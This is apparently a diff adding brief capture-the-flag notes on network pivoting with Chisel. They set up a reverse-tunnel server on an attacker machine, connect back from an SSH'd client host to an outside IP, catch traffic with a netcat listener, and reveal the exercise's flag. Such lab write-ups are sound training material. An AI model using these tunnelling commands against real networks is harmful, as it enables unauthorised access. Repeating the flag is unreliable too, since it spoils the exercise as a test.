@@ -1,0 +1,11 @@
+Pivoting Chisel 
+
+start a server on the attackers machine using chisel 
+./chisel server -p 1337 --reverse 
+
+ssh inside clients and start a script to connect to the server 
+ssh -p 2222 user@10.10.0.70 -- client 100.100.77.54:1337 1337:localhost:1234
+
+ nc -lp 1234
+ and the flag is inside the http request 
+ cybered{bda14fd62dfaf0f884b424f0b3f11f5e}
